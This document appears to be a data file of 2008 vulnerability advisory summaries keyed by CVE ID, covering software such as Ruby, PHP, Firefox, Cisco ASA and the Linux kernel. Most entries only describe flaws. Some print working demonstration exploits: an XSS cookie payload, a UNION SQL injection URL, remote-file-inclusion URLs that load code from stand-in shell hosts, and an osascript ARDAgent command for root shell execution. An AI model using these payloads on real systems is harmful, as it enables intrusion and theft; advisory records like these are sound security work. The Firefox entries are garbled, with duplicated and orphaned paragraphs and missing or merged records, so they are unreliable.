CVE-2008-2663.body: Several vulnerabilities were reported in Ruby. A user can execute arbitrary code on the target system. A user can cause denial of service conditions.A user can execute arbitrary code on the target system or cause denial of service conditions on the target system.A remote user may be able to exploit these vulnerabilities, depending on the specific application code.Drew Yao of Apple Product Security reported these vulnerabilities.
CVE-2008-2663.extra: A user can execute arbitrary code on the target system.A user can cause denial of service conditions.

CVE-2008-2664.title: Ruby Bugs Let Users Deny Service and Execute Arbitrary Code
CVE-2008-2664.body: Several vulnerabilities were reported in Ruby. A user can execute arbitrary code on the target system. A user can cause denial of service conditions.A user can execute arbitrary code on the target system or cause denial of service conditions on the target system.A remote user may be able to exploit these vulnerabilities, depending on the specific application code.Drew Yao of Apple Product Security reported these vulnerabilities.
CVE-2008-2664.extra: A user can execute arbitrary code on the target system.A user can cause denial of service conditions.

CVE-2008-2665.title: PHP posix_access() safe_mode Restrictions Can By Bypass With 'http://' Prefix
CVE-2008-2665.body: A vulnerability was reported in PHP. A user can bypass safe_mode restrictions.A user can supply a specially crafted value to the posix_access() function to bypass safe_mode restrictions. A value beginning with the 'http://' prefix can trigger the flaw.Other functions are affected.Maksymilian Arciemowicz (cXIb8O3) of SecurityReason.com reported this vulnerability.
CVE-2008-2665.extra: A user can bypass safe_mode restrictions.

CVE-2008-2666.title: PHP File and Directory Function safe_mode Restrictions Can By Bypass With 'http://' Prefix
CVE-2008-2666.body: A vulnerability was reported in PHP. A user can bypass safe_mode restrictions.A user can supply a specially crafted value to various file and directory functions, including the chdir() and ftok() functions to bypass safe_mode restrictions. A value beginning with the 'http://' prefix can trigger the flaw.Other functions are affected.Maksymilian Arciemowicz (cXIb8O3) of SecurityReason.com reported this vulnerability.
CVE-2008-2666.extra: A user can bypass safe_mode restrictions.

CVE-2008-2703.title: Novell GroupWise Messenger Stack Overflows Let Remote Users Execute Arbitrary Code
CVE-2008-2703.body: A vulnerability was reported in Novell GroupWise Messenger. A remote user can execute arbitrary code on the target system.A remote user can send specially crafted spoofed responses to the target client to trigger a stack overflow and execute arbitrary code on the target system. The code will run with the privileges of the target user.
CVE-2008-2703.extra: A remote user can execute arbitrary code on the target system.

CVE-2008-2704.title: Novell GroupWise Messenger Stack Overflows Let Remote Users Execute Arbitrary Code
CVE-2008-2704.body: A vulnerability was reported in Novell GroupWise Messenger. A remote user can execute arbitrary code on the target system.A remote user can send specially crafted spoofed responses to the target client to trigger a stack overflow and execute arbitrary code on the target system. The code will run with the privileges of the target user.
CVE-2008-2704.extra: A remote user can execute arbitrary code on the target system.

CVE-2008-2705.title: Sun Java System Access Manager Grants Administrator Access to Remote Users
CVE-2008-2705.body: A vulnerability was reported in Sun Java System Access Manager. A remote user can gain administrative access to the target application.A remote user can bypass authentication and gain access to resources on the target system or gain administrator access to the target application.Only systems that are configured to use Sun Directory Server Enterprise Edition (DSEE) 5.2 in any configuration or Sun Directory Server Enterprise Edition (DSEE) 6 with a configuration mode that allows binds without a password as the backend are affected.
CVE-2008-2705.extra: A remote user can gain administrator access to the target application.

CVE-2008-2706.title: Solaris Event Port Implementation Null Pointer Dereference Lets Local Users Deny Service
CVE-2008-2706.body: A vulnerability was reported in Solaris in the event port implementation. A local user can cause denial of service conditions.A local user can invoke an application program that submits and retrieves user-defined events from a port to trigger null pointer dereference, causing a system panic.
CVE-2008-2706.extra: A local user can cause a system panic.

CVE-2008-2707.title: Solaris e1000g Gigabit Ethernet Driver Lets Remote Users Deny Service
CVE-2008-2707.body: A vulnerability was reported in Solaris in the e1000g Gigabit Ethernet driver. A remote user can cause denial of service conditions.On systems with Intel 82571/82572 network interface controllers, a remote user can block all inbound network traffic.
CVE-2008-2707.extra: A remote user can block inbound network traffic.

CVE-2008-2710.title: Solaris IP Multicast Filter Bug Lets Local Users Deny Service or Gain Elevated Privileges
CVE-2008-2710.body: A vulnerability was reported in Solaris. A local user can obtain elevated privileges on the target system. A local user can cause denial of service conditions.A local user can send a specially crafted SIOCSIPMSFILTER IOCTL request to execute arbitrary code with kernel level privileges on the target system.A local user can also trigger a kernel panic.The vendor was notified on August 20, 2007.Tobias Klein reported this vulnerability.The original advisory is available at:http://www.trapkit.de/advisories/TKADV2008-003.txt
CVE-2008-2710.extra: A local user can obtain elevated privileges on the target system.A local user can cause denial of service conditions on the target system.

CVE-2008-2711.title: Fetchmail Verbose Logging Bug Lets Remote Users Deny Service
CVE-2008-2711.body: A vulnerability was reported in Fetchmail. A remote user can cause denial of service conditions.A remote user can send e-mail with specially crafted header data that, when retrieved by fetchmail, will cause the target service to crash. The system is affected when in '-v -v' verbose mode.The vulnerability resides in 'report.c'.Gunter Nau reported this vulnerability.
CVE-2008-2711.extra: A remote user can cause the target service to crash.

CVE-2008-2712.title: Vim Flaw in Quoting Vim Script Lets Remote Users Cause Arbitrary Commands to Be Executed in Certain Cases
CVE-2008-2712.body: A vulnerability was reported in Vim. A remote user can cause arbitrary commands to be executed on the target user's system.A remote user can create a file or filename containing specially crafted Vim Script code that, when loaded by the target user, will execute arbitrary commands on the target system. The commands will run with the privileges of the target user.The 'tar.vim', 'zip.vim', 'xpm.vim', 'xpm2.vim', 'gzip.vim', and 'netrw.vim' plug-ins are also affected.The vendor was notified on May 13, 2008.The original advisory is available at:http://www.rdancer.org/vulnerablevim.htmlJan Minar reported this vulnerability.
CVE-2008-2712.extra: A remote user can create a file that, when edited by the target user, will execute arbitrary commands on the target user's system.

CVE-2008-2713.title: Clam AntiVirus Memory Access Bug in Processing Petite Formatted Files Lets Remote Users Deny Service
CVE-2008-2713.body: A vulnerability was reported in Clam AntiVirus. A remote user can cause denial of service conditions.A remote user can send a specially crafted Petite formatted file that, when processed by the target application, will cause the target application to crash.The vulnerability resides in 'libclamav/petite.c'.Damian Put reported this vulnerability.
CVE-2008-2713.extra: A remote user can cause the target application to crash.

CVE-2008-2715.title: Opera HTML Canvas Processing Bug Lets Remote Users Obtain Image Data
CVE-2008-2715.body: A vulnerability was reported in Opera. A remote user can obtain images.A remote user can create HTML that, when loaded by the target user, will obtain image data from the target user's browser for images in the context of a different domain.
CVE-2008-2715.extra: A remote user can obtain image data from images in a different domain.

CVE-2008-2719.title: NASM Stack Overflow in Processing ASM Files Lets Users Execute Arbitrary Code
CVE-2008-2719.body: A vulnerability was reported in NASM. A remote user can cause arbitrary code to be executed on the target user's system.A remote user can create a specially crafted ASM file that, when loaded by the target user, will trigger a stack overflow and execute arbitrary code on the target system. The code will run with the privileges of the target user.Philipp Thomas reported this vulnerability.The original advisory is available at:https://sourceforge.net/tracker/?func=detail&atid=106208&aid=1942146&group_id=6208
CVE-2008-2719.extra: A remote user can create a file that, when loaded by the target user, will execute arbitrary code on the target user's system.

CVE-2008-2725.body: Several vulnerabilities were reported in Ruby. A user can execute arbitrary code on the target system. A user can cause denial of service conditions.A user can execute arbitrary code on the target system or cause denial of service conditions on the target system.A remote user may be able to exploit these vulnerabilities, depending on the specific application code.Drew Yao of Apple Product Security reported these vulnerabilities.
CVE-2008-2725.extra: A user can execute arbitrary code on the target system.A user can cause denial of service conditions.

CVE-2008-2726.title: Ruby Bugs Let Users Deny Service and Execute Arbitrary Code
CVE-2008-2726.body: Several vulnerabilities were reported in Ruby. A user can execute arbitrary code on the target system. A user can cause denial of service conditions.A user can execute arbitrary code on the target system or cause denial of service conditions on the target system.A remote user may be able to exploit these vulnerabilities, depending on the specific application code.Drew Yao of Apple Product Security reported these vulnerabilities.
CVE-2008-2726.extra: A user can execute arbitrary code on the target system.A user can cause denial of service conditions.

CVE-2008-2729.title: Linux Kernel AMD64 Memory Copy Bug Lets Local Users View Memory Contents
CVE-2008-2729.body: A vulnerability was reported in the Linux Kernel. A local user can view potentially sensitive memory contents.The __copy_from_user_inatomic() function on certain AMD64-based systems does not properly initialize the destination memory location when copying kernel memory. A local user can exploit this to view potentially sensitive information.
CVE-2008-2729.extra: A local user can view potentially sensitive memory contents.

CVE-2008-2730.title: Cisco Unified Communications Manager Lets Remote Users Access Statistics
CVE-2008-2730.body: A vulnerability was reported in Cisco Unified Communications Manager. A remote user can bypass authentication to access statistics.A remote user can connect to the Real-Time Information Server (RIS) Data Collector service on TCP port 2556 to bypass authentication and gain access to CUCM cluster statistics.For CUCM 4.x versions, Cisco has assigned Cisco Bug ID CSCsq35151 to this vulnerability [CVE-2008-2062]. For CUCM 5.x and 6.x versions, Cisco has assigned Cisco Bug ID CSCsj90843 to this vulnerability [CVE-2008-2730].The following version are affected: * Cisco Unified CallManager 4.1 versions * Cisco Unified Communications Manager 4.2 versions prior to 4.2(3)SR4 * Cisco Unified Communications Manager 4.3 versions prior to 4.3(2)SR1 * Cisco Unified Communications Manager 5.x versions prior to 5.1(3c) * Cisco Unified Communications Manager 6.x versions prior to 6.1(2)Cisco Unified Communications Manager Express is not affected.VoIPshield reported this vulnerability.
CVE-2008-2730.extra: A remote user can access CUCM statistics.

CVE-2008-2734.title: Cisco ASA SSL VPN Bugs Let Remote Users Deny Service
CVE-2008-2734.body: A vulnerability was reported in Cisco ASA in the processing of SSL VPNs. A remote user can cause denial of service conditions.A remote user can send a specially crafted SSL or HTTP packet to trigger a memory leak or URI processing flaw and cause the target device to reload.Devices configured to terminate SSL VPNs are affected.Cisco has assigned Cisco Bug IDs CSCso66472 and CSCsq19369 to this vulnerability.
CVE-2008-2734.extra: A remote user can cause the target device to reload.

CVE-2008-2735.title: Cisco ASA SSL VPN Bugs Let Remote Users Deny Service
CVE-2008-2735.body: A vulnerability was reported in Cisco ASA in the processing of SSL VPNs. A remote user can cause denial of service conditions.A remote user can send a specially crafted SSL or HTTP packet to trigger a memory leak or URI processing flaw and cause the target device to reload.Devices configured to terminate SSL VPNs are affected.Cisco has assigned Cisco Bug IDs CSCso66472 and CSCsq19369 to this vulnerability.
CVE-2008-2735.extra: A remote user can cause the target device to reload.

CVE-2008-2736.title: Cisco ASA Clientless VPN Feature May Disclose Sensitive Information to Remote Users
CVE-2008-2736.body: A vulnerability was reported in Cisco ASA. A remote user can obtain potentially sensitive information.A remote user that can cause the target user to connect to a remote server or reply to an e-mail can obtain potentially sensitive information, such as usernames and passwords.Systems with clientless VPNs enabled are affected.Cisco has assigned Cisco Bug ID CSCsq45636 to this vulnerability.
CVE-2008-2736.extra: A remote user can obtain potentially sensitive information, such as VPN usernames and passwords.

CVE-2008-2743.title: Xerox Copier/Printer Input Validation Hole Permits Cross-Site Scripting Attacks
CVE-2008-2743.body: A vulnerability was reported in the Xerox Copier/Printer. A remote user can conduct cross-site scripting attacks.The web interface does not properly filter HTML code from user-supplied input before displaying the input. A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the Xerox Copier/Printer device and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.Louhi Networks of Finland reported this vulnerability.
CVE-2008-2743.extra: A remote user can access the target user's cookies (including authentication cookies), if any, associated with the Xerox Copier/Printer device, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.

CVE-2008-2744.title: vBulletin Input Validation Hole in 'redirect' Parameter Permits Cross-Site Scripting Attacks
CVE-2008-2744.body: A vulnerability was reported in vBulletin. A remote user can conduct cross-site scripting attacks.The login page of the administrative control panel does not properly filter HTML code from user-supplied input in the 'redirect' parameter before displaying the input. A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the vBulletin software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.A demonstration exploit URL is provided:http://[target]/vB3/admincp/index.php?redirect={XSS}
CVE-2008-2744.extra: A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the vBulletin software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.

CVE-2008-2750.title: Linux Kernel pppol2tp_recvmsg() Memory Corruption Error Lets Remote Users Deny Service
CVE-2008-2750.body: A vulnerability was reported in the Linux Kernel. A remote user can cause denial of service conditions.A remote user can send specially crafted PPP packets via L2TP to trigger a memory corruption error and cause the target system to crash or become unstable.Ilja of the Netric Security Team reported this vulnerability.
CVE-2008-2750.extra: A remote user can cause denial of service conditions.

CVE-2008-2779.title: CuteFTP Directory Traversal Bug Lets Remote Servers Write Files to Arbitrary Locations
CVE-2008-2779.body: A vulnerability was reported in CuteFTP. A remote server can write files to arbitrary locations on the target user's system.The client software does not properly validate server-supplied filenames in response to the FTP LIST command. A remote server can supply a specially crafted filename in response to the target user's request to download a directory to cause the file to be written to an arbitrary location on the target user's system. Files will be written with the privileges of the target user.The vendor was notified on May 14, 2008.The original advisory is available at:http://vuln.sg/cuteftp820-en.htmlTan Chew Keong of vuln.sg reported this vulnerability.
CVE-2008-2779.extra: A remote server can write files to arbitrary locations on the target user's system.

CVE-2008-2785.title: Mozilla Firefox CSS Reference Counter Bug Lets Remote Users Execute Arbitrary Code
CVE-2008-2785.body: A vulnerability was reported in Mozilla Firefox. A remote user can cause arbitrary code to be executed on the target user's system.A remote user can create a large number of references to a common CSS object to overflow the CSSValue array data structure. The browser will attempt to free the object while it is still in use, which may allow arbitrary code to be executed. The code will run with the privileges of the target user.TippingPoint reported this vulnerability.
CVE-2008-2785.extra: A remote user can cause arbitrary code to be executed on the target user's system.

CVE-2008-2787.title: OpenDocMan Input Validation Hole in 'last_message' Parameter Permits Cross-Site Scripting Attacks
CVE-2008-2787.body: A vulnerability was reported in OpenDocMan. A remote user can conduct cross-site scripting attacks.The software does not properly filter HTML code from user-supplied input in the 'last_message' parameter before displaying the input. A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the OpenDocMan software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.A demonstration exploit URL is provided:http://[target]/opendocman-1.2.5/out.php?last_message=%3Cscript%3Ealert(document.cookie)%3C/script%3ESergi Rosello reported this vulnerability.The original advisory is available at:http://www.s21sec.com/avisos/s21sec-044-en.txt
CVE-2008-2787.extra: A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the OpenDocMan software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.

CVE-2008-2794.title: Symantec Altiris Notification Server Agent Lets Local Users Gain Elevated Privileges
CVE-2008-2794.body: A vulnerability was reported in Symantec Altiris Notification Server Agent. A local user can obtain elevated privileges on the target system.A local user can exploit a flaw in the agent's graphical user interface to gain elevated privileges.Brett Moore of Insomnia Security reported this vulnerability.
CVE-2008-2794.extra: A local user can obtain elevated privileges on the target system.

CVE-2008-2798.title: Mozilla Firefox 2.0 Has Multiple Bugs That Permit Remote Code Execution, Certificate Spoofing, Cross-Site Scripting, and Other Impacts
CVE-2008-2798.body: Several vulnerabilities were reported in Mozilla Firefox. A remote user can cause arbitrary code to be executed on the target user's system. A remote user can conduct cross-site scripting attacks.A remote user can create specially crafted HTML that, when loaded by the target user, will crash the target user's browser, execute arbitrary code on the target user's browser, obtain files from the target user's system, spoof trusted certificates, or initiate arbitrary socket connections.A remote user can also cause arbitrary scripting code to be executed by the target user's browser. The code will run in the security context of arbitrary domains. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.
CVE-2008-2798.extra: A remote user can create HTML that, when loaded by the target user, execute arbitrary code on the target user's browser, obtain files from the target user's system, spoof trusted certificates, initiate arbitrary socket connections, or execute scripting code in arbitrary domains.

The code will run in the security context of arbitrary domains. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.

As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.
CVE-2008-2801.extra: A remote user can create HTML that, when loaded by the target user, execute arbitrary code on the target user's browser, obtain files from the target user's system, spoof trusted certificates, initiate arbitrary socket connections, or execute scripting code in arbitrary domains.

CVE-2008-2802.title: Mozilla Firefox 2.0 Has Multiple Bugs That Permit Remote Code Execution, Certificate Spoofing, Cross-Site Scripting, and Other Impacts
CVE-2008-2802.body: Several vulnerabilities were reported in Mozilla Firefox. A remote user can cause arbitrary code to be executed on the target user's system. A remote user can conduct cross-site scripting attacks.A remote user can create specially crafted HTML that, when loaded by the target user, will crash the target user's browser, execute arbitrary code on the target user's browser, obtain files from the target user's system, spoof trusted certificates, or initiate arbitrary socket connections.A remote user can also cause arbitrary scripting code to be executed by the target user's browser. The code will run in the security context of arbitrary domains. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.

CVE-2008-2809.title: Mozilla Firefox subjectAltName:dNSName Attribute Validation Flaw Lets Remote Users Spoof Certificates
CVE-2008-2809.body: A vulnerability was reported in Mozilla Firefox. A remote user can spoof certificates using domain wildcards.A remote user can create a certificate with a specially crafted 'subjectAltName:dNSName' attribute that uses wildcard patterns in the attribute value. If the target user accepts the certificate as valid (when presented with the unknown Certificate Authority warning), the browser will consider the certificate to be valid for the hostnames specified in the 'subjectAltName:dNSName' attributes.Nils Toedtmann reported this vulnerability.The original advisory is available at:http://nils.toedtmann.net/pub/subjectAltName.txt
CVE-2008-2809.extra: A remote user can spoof certificates in certain cases.

CVE-2008-2809.title: Mozilla Firefox 2.0 Has Multiple Bugs That Permit Remote Code Execution, Certificate Spoofing, Cross-Site Scripting, and Other Impacts

A remote user can conduct cross-site scripting attacks.A remote user can create specially crafted HTML that, when loaded by the target user, will crash the target user's browser, execute arbitrary code on the target user's browser, obtain files from the target user's system, spoof trusted certificates, or initiate arbitrary socket connections.A remote user can also cause arbitrary scripting code to be executed by the target user's browser. CVE-2008-2811.title: Mozilla Firefox 2.0 Has Multiple Bugs That Permit Remote Code Execution, Certificate Spoofing, Cross-Site Scripting, and Other Impacts

A remote user can conduct cross-site scripting attacks.A remote user can create specially crafted HTML that, when loaded by the target user, will crash the target user's browser, execute arbitrary code on the target user's browser, obtain files from the target user's system, spoof trusted certificates, or initiate arbitrary socket connections.A remote user can also cause arbitrary scripting code to be executed by the target user's browser. CVE-2008-2824.title: Xerox WorkCentre Extensible Interface Platform Bug Lets Remote Users Modify the Configuration
CVE-2008-2824.body: A vulnerability was reported in Xerox WorkCentre. A remote user can modify the system configuration.A remote user can access the Extensible Interface Platform feature to make modifications to the target system configuration.
CVE-2008-2824.extra: A remote user can modify the system configuration.

CVE-2008-2825.title: Xerox WorkCentre Input Validation Hole Permits Cross-Site Scripting Attacks
CVE-2008-2825.body: A vulnerability was reported in Xerox WorkCentre. A remote user can conduct cross-site scripting attacks.The web interface does not properly filter HTML code from user-supplied input before displaying the input. A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the Xerox WorkCentre web interface and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.Henri Lindberg of Louhi Networks, Finland, (www.louhi.fi) reported this vulnerability.
CVE-2008-2825.extra: A remote user can access the target user's cookies (including authentication cookies), if any, associated with the Xerox WorkCentre web interface, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.

CVE-2008-2826.title: Linux Kernel Integer Overflow in sctp_getsockopt_local_addrs_old() Lets Local Users Deny Service
CVE-2008-2826.body: A vulnerability was reported in the Linux Kernel in the Stream Control Transmission Protocol code. A local user can cause denial of service conditions.A local user can supply specially crafted addr_num data in an sctp_getaddrs_old data structure to trigger an integer overflow in the sctp_getsockopt_local_addrs_old() function and consume excessive resources on the target system.The vulnerability resides in 'net/sctp/socket.c'.
CVE-2008-2826.extra: A local user can cause excessive resource consumption on the target system.

CVE-2008-2827.title: Perl rmtree() Function Lets Local Users Gain Elevated Privileges
CVE-2008-2827.body: A vulnerability was reported in Perl. A local user can obtain elevated privileges on the target system.The rmtree() function in 'lib/File/Path.pm' does not properly manage permissions on symbolic links (symlinks). The function changes the permissions of the symlink target to the permissions of the symlink, which may be world-writable and world-readable permissions.A local user can exploit this to obtain root privileges on the target system.The vendor's bug report is available at:http://rt.cpan.org/Public/Bug/Display.html?id=36982Ben Hutchings reported this vulnerability.
CVE-2008-2827.extra: A local user can obtain root privileges on the target system.

CVE-2008-2830.title: Mac OS X Apple Remote Desktop Agent Lets Local Users Gain Root Privileges
CVE-2008-2830.body: A vulnerability was reported in Mac OS X in the Apple Remote Desktop Agent. A local user can obtain root privileges on the target system.A local user can invoke the Apple Remote Desktop Agent and supply AppleScript to execute arbitrary commands on the target system with root privileges.A demonstration exploit command is provided:osascript -e 'tell app "ARDAgent" to do shell script "whoami"'Some versions of 10.4 may not be affected.
CVE-2008-2830.extra: A local user can obtain root privileges on the target system.

CVE-2008-2836.title: WebCalendar Include File Bug in 'send_reminders.php' Lets Remote Users Execute Arbitrary Code
CVE-2008-2836.body: A vulnerability was reported in WebCalendar. A remote user can include and execute arbitrary code on the target system.The software does not properly validate user-supplied input. A remote user can supply a specially crafted URL to cause the target system to include and execute arbitrary PHP code from a remote location. The PHP code, including operating system commands, will run with the privileges of the target web service.A demonstration exploit URL is provided:http://[target]/patch/tools/send_reminders.php?noSet=0&includedir=http://sheLLz?The original advisory is available at:http://www.milw0rm.com/exploits/5847Cr@zy_King from BiyoSecurity Team reported this vulnerability.
CVE-2008-2836.extra: A remote user can execute arbitrary PHP code and operating system commands on the target system with the privileges of the target web service.

CVE-2008-2868.title: DUcalendar Input Validation Flaw in 'iEve' Parameter Lets Remote Users Inject SQL Commands
CVE-2008-2868.body: A vulnerability was reported in DUcalendar. A remote user can inject SQL commands.The 'detail.asp' script does not properly validate user-supplied input in the 'iEve' parameter. A remote user can supply a specially crafted parameter value to execute SQL commands on the underlying database.The original advisory is available at:http://milw0rm.com/exploits/5927Bl@ckbe@rD reported this vulnerability.
CVE-2008-2868.extra: A remote user can execute SQL commands on the underlying database.

CVE-2008-2905.title: Mambo Include File Bug in Cache_Lite Class Lets Remote Users Execute Arbitrary Code
CVE-2008-2905.body: A vulnerability was reported in Mambo. A remote user can include and execute arbitrary code on the target system.The 'output.php' script in the Cache_Lite class does not properly validate user-supplied input. A remote user can supply a specially crafted URL to cause the target system to include and execute arbitrary PHP code from a remote location. The PHP code, including operating system commands, will run with the privileges of the target web service.A demonstration exploit URL is provided:http://[target]/[path]/includes/Cache/Lite/Output.php?mosConfig_absolute_path=http://shell?The original advisory is available at:http://milw0rm.com/exploits/5808irk4z at yahoo.pl reported this vulnerability.
CVE-2008-2905.extra: A remote user can execute arbitrary PHP code and operating system commands on the target system with the privileges of the target web service.

CVE-2008-2908.title: Novell iPrint Client Stack Overflows Let Remote Users Execute Arbitrary Code
CVE-2008-2908.body: A vulnerability was reported in Novell iPrint. A remote user can cause arbitrary code to be executed on the target user's system.A remote user can create specially crafted HTML that, when loaded by the target user, will invoke the 'ienipp.ocx' ActiveX control and trigger a stack overflow to execute arbitrary code on the target user's system.The CLSID of the vulnerable control is: 36723F97-7AA0-11D4-8919-FF2D71D0D32CWill Dormann of CERT/CC reported this vulnerability.
CVE-2008-2908.extra: A remote user can cause arbitrary code to be executed on the target user's system.

CVE-2008-2909.title: Clever Copy Input Validation Flaw in 'results.php' Lets Remote Users Inject SQL Commands
CVE-2008-2909.body: A vulnerability was reported in Clever Copy. A remote user can inject SQL commands.The 'results.php' script does not properly validate user-supplied input in the 'searchtype' parameter. A remote user can supply a specially crafted parameter value to execute SQL commands on the underlying database.The original advisory is available at:http://milw0rm.com/exploits/5794h0yt3r reported this vulnerability.
CVE-2008-2909.extra: A remote user can execute SQL commands on the underlying database.

CVE-2008-2917.title: E-SMART CART Input Validation Flaw in 'productsofcat.asp' Lets Remote Users Inject SQL Commands
CVE-2008-2917.body: A vulnerability was reported in E-SMART CART. A remote user can inject SQL commands.The 'productsofcat.asp' script does not properly validate user-supplied input in the 'category_id' parameter. A remote user can supply a specially crafted parameter value to execute SQL commands on the underlying database.A demonstration exploit URL is provided:http://[target]/PATH/store/productsofcat.asp?p=1&category_id=[SQL]22+and+1=2+union+all+select+1,name,3,0+from+msysobjectsJose Luis Gongora Fernandez (JosS) reported this vulnerability.
CVE-2008-2917.extra: A remote user can execute SQL commands on the underlying database.

CVE-2008-2923.title: ListManager Input Validation Hole in 'words' Parameter Permits Cross-Site Scripting Attacks
CVE-2008-2923.body: A vulnerability was reported in ListManager. A remote user can conduct cross-site scripting attacks.The 'read/search/results' function does not properly filter HTML code from user-supplied input in the 'words' parameter before displaying the input. A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the ListManager software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.holisticinfosec.org reported this vulnerability.The original advisory is available at:http://holisticinfosec.org/content/view/71/45/
CVE-2008-2923.extra: A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the ListManager software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.

CVE-2008-2926.title: CA Personal Firewall 'kmxfw.sys' IOCTL Validation Flaw Lets Local Users Gain Elevated Privileges
CVE-2008-2926.body: A vulnerability was reported in CA Personal Firewall. A local user can obtain elevated privileges on the target system.A local user can supply a specially crafted IOCTL request to the 'kmxfw.sys' driver to cause the target system to crash or execute arbitrary code.Tobias Klein reported this vulnerability.
CVE-2008-2926.extra: A local user can obtain kernel level privileges on the target system.

CVE-2008-2926.title: CA Internet Security 'kmxfw.sys' IOCTL Validation Flaw Lets Local Users Gain Elevated Privileges
CVE-2008-2926.body: A vulnerability was reported in CA Internet Security. A local user can obtain elevated privileges on the target system.A local user can supply a specially crafted IOCTL request to the 'kmxfw.sys' driver to cause the target system to crash or execute arbitrary code.Tobias Klein reported this vulnerability.
CVE-2008-2926.extra: A local user can obtain kernel level privileges on the target system.

CVE-2008-2926.title: CA Host-Based Intrusion Prevention System 'kmxfw.sys' IOCTL Validation Flaw Lets Local Users Gain Elevated Privileges
CVE-2008-2926.body: A vulnerability was reported in CA Host-Based Intrusion Prevention System. A local user can obtain elevated privileges on the target system.A local user can supply a specially crafted IOCTL request to the 'kmxfw.sys' driver to cause the target system to crash or execute arbitrary code.Tobias Klein reported this vulnerability.
CVE-2008-2926.extra: A local user can obtain level privileges on the target system.

CVE-2008-2927.title: Pidgin Integer Overflow in msn_slplink_process_msg() Lets Remote Users Execute Arbitrary Code
CVE-2008-2927.body: A vulnerability was reported in Pidgin. A remote user can execute arbitrary code on the target system.A remote user can send a specially crafted SLP message to trigger an integer overflow in the MSN protocol handler and execute arbitrary code on the target user's system. The code will run with the privileges of the target user.The overflows reside in 'libpurple/protocols/msn/slplink.c' and 'libpurple/protocols/msnp9/slplink.c'.
CVE-2008-2927.extra: A remote user can execute arbitrary code on the target system.

CVE-2008-2928.title: Red Hat Directory Server Buffer Overflow in Processing Accept-Language HTTP Header Values Lets Remote Users Execute Arbitrary Code
CVE-2008-2928.body: A vulnerability was reported in Red Hat Directory Server. A remote user can execute arbitrary code on the target system.A remote user can send specially crafted data to trigger a buffer overflow in the parsing of Accept-Language HTTP header values and execute arbitrary code on the target system. The code will run with the privileges of the target service (i.e., root privileges).
CVE-2008-2928.extra: A remote user can execute arbitrary code on the target system.

CVE-2008-2929.title: Red Hat Directory Server Administration Express and Directory Server Gateway Input Validation Hole Permits Cross-Site Scripting Attacks
CVE-2008-2929.body: A vulnerability was reported in Red Hat Directory Server. A remote user can conduct cross-site scripting attacks.The Directory Server Administration Express and Directory Server Gateway (DSGW) web interface does not properly filter HTML code from user-supplied input before displaying the input. A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the Red Hat Directory Server software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.
CVE-2008-2929.extra: A remote user can access the target user's cookies (including authentication cookies), if any, associated with the site running the Red Hat Directory Server software, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.

CVE-2008-2930.title: Red Hat Directory Server Search Request Processing Bug Lets Remote Users Deny Service
CVE-2008-2930.body: A vulnerability was reported in Red Hat Directory Server. A remote user can cause denial of service conditions.A remote user can send an LDAP search request against specially crafted data records to cause the target service to consume excessive CPU resources.Ulf Weltman of Hewlett Packard reported this vulnerability.
CVE-2008-2930.extra: A remote user can cause the target service to consume excessive CPU resources.

CVE-2008-2933.title: Mozilla Firefox Command-line URL Processing Bug Lets Remote Users Open Tabs and Execute Arbitrary Code
CVE-2008-2933.body: A vulnerability was reported in Mozilla Firefox. A remote user can cause arbitrary code to be executed on the target user's system.Another application that can invoke Firefox (while Firefox is not already running) can pass a specially crafted command-line URI containing pipe symbols to cause Firefox to open multiple tabs.This can be exploited to access files on the target user's system or, in combination with an input validation vulnerability in an XUL-based error page, to execute arbitrary code on the target user's system.Billy Rios reported this vulnerability. Ben Turner and Dan Veditz reported the XUL error page input validation vulnerability.
CVE-2008-2933.extra: A remote user can execute arbitrary code on the target user's system.

CVE-2008-2934.title: Mozilla Firefox GIF File Processing Bug on Mac OS X May Let Remote Users Execute Arbitrary Code
